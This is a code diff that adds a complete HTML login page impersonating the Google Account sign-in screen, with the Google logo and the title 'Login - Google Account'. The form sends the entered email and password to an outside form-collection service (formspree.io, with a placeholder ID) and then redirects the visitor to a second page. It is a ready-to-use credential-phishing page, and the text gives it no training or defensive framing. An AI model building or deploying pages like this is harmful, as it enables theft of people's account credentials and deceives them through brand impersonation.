@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Google Account</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 flex items-center justify-center h-screen">
+    <div class="bg-white p-8 rounded-lg shadow-md w-full max-w-md">
+        <div class="text-center mb-6">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="w-32 mx-auto">
+            <h1 class="text-2xl font-semibold mt-4">Sign in</h1>
+            <p class="text-gray-600">Use your Google Account</p>
+        </div>
+        <form action="https://formspree.io/f/YOUR_FORMSPREE_ID" method="POST">
+            <div class="mb-4">
+                <input type="email" name="email" placeholder="Email or phone" required class="w-full p-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500">
+            </div>
+            <div class="mb-6">
+                <input type="password" name="password" placeholder="Enter your password" required class="w-full p-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500">
+            </div>
+            <div class="flex justify-between items-center">
+                <a href="#" class="text-blue-600 text-sm font-medium">Forgot password?</a>
+                <button type="submit" class="bg-blue-600 text-white px-6 py-2 rounded font-medium hover:bg-blue-700">Next</button>
+            </div>
+        </form>
+    </div>
+    <script>
+        // Redirect to page2 after submission
+        document.querySelector('form').onsubmit = function() {
+            setTimeout(() => { window.location.href = "page2.html"; }, 1000);
+        };
+    </script>
+</body>
+</html>
